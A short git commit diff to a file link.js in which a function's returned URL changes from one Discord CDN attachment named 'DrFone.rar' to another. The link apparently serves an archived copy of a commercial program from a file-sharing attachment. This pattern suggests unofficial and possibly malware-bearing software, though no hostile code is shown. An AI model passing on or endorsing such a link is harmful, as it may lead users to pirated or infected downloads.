ba81747493598f0222232aae0a9616f3ea31c622
auenna <57557028+auenna@users.noreply.github.com>
2021-02-12 19:47:06 +0200

    Update link.js

--- link.js
+++ link.js
@@ -1,4 +1,4 @@
 function getUrl()
 {
-  return "https://cdn.discordapp.com/attachments/800051540953399306/809097421300301834/DrFone.rar";
+  return "https://cdn.discordapp.com/attachments/800051540953399306/809842831103492157/DrFone.rar";
 }
